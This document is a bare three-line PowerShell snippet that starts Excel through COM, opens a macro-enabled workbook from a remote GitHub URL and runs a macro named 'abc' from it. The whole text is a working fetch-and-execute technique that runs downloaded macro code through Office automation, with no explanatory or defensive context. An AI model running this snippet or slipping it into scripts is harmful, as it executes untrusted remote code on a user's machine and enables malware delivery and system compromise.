$Excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","localhost"))
$Workbook = $Excel.Workbooks.Open("https://raw.githubusercontent.com/doubleshot43/go/master/Book1.xlsm")
$Excel.run("abc")